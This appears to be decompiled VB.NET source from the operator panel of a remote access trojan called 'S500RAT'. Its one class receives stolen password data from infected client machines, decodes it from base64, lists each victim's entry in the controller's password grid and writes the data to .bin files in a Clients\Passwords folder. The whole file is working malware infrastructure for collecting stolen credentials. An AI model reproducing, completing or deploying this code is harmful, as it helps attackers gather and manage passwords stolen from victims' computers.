Imports System
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000066 RID: 102
	Public Class RecoviryPasswords
		' Token: 0x060011CB RID: 4555 RVA: 0x0009F00C File Offset: 0x0009D20C
		Public Shared Sub AddArray(Client_0 As Clients, unpack_msgpack As MsgPack)
			Dim CS$<>8__locals1 As RecoviryPasswords._Closure$__3-0 = New RecoviryPasswords._Closure$__3-0()
			Dim flag As Boolean = Client_0 Is Nothing
			If flag Then
				Throw New ArgumentNullException("Client_0")
			End If
			Try
				Dim flag2 As Boolean = Not Directory.Exists(RecoviryPasswords.Folder)
				If flag2 Then
					Directory.CreateDirectory(RecoviryPasswords.Folder)
				End If
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
			Dim CS$<>8__locals2 As RecoviryPasswords._Closure$__3-0 = CS$<>8__locals1
			Dim msgPack As MsgPack = unpack_msgpack.ForcePathObject("PASS")
			Dim msgPack2 As MsgPack = msgPack
			Dim asString As String = msgPack.AsString
			Dim expression As String = Functions.DencryptBase64ToString(asString)
			msgPack2.AsString = asString
			CS$<>8__locals2.$VB$Local_SplInfoAndData = Strings.Split(expression, "%'SPL'%", -1, CompareMethod.Binary)
			CS$<>8__locals1.$VB$Local_item = New DataGridViewRow() With { .Height = 30 }
			Try
				CS$<>8__locals1.$VB$Local_item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IMAGMiningL1.Images("Key.png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				CS$<>8__locals1.$VB$Local_item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = CS$<>8__locals1.$VB$Local_SplInfoAndData(0).ToString() })
				CS$<>8__locals1.$VB$Local_item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = CS$<>8__locals1.$VB$Local_SplInfoAndData(1).ToString() })
				CS$<>8__locals1.$VB$Local_item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = Functions.BytesToSize(CLng(CS$<>8__locals1.$VB$Local_SplInfoAndData(2).Length)) })
				CS$<>8__locals1.$VB$Local_item.Resizable = DataGridViewTriState.[False]
				File.WriteAllText(RecoviryPasswords.Folder + "\" + CS$<>8__locals1.$VB$Local_SplInfoAndData(0).ToString() + ".bin", CS$<>8__locals1.$VB$Local_SplInfoAndData(2).ToString())
			Catch ex2 As Exception
				ListLogs.AddArray("Recovery Passwords! : " + ex2.Message, 0)
				Return
			End Try
			DataB.form1_0.Invoke(New MethodInvoker(Sub()
				DataB.form1_0.ListPassword.Rows.Add(CS$<>8__locals1.$VB$Local_item)
				DataB.form1_0.NumListPasswords.Text = Conversions.ToString(DataB.form1_0.ListPassword.Rows.Count) + "+"
				ListLogs.AddArray("Recovery Passwords : Client " + CS$<>8__locals1.$VB$Local_SplInfoAndData(0).ToString() + " Ready", 3)
			End Sub))
		End Sub

		' Token: 0x040007D5 RID: 2005
		Private Shared Folder As String = Application.StartupPath + "\Clients\Passwords"
	End Class
End Namespace
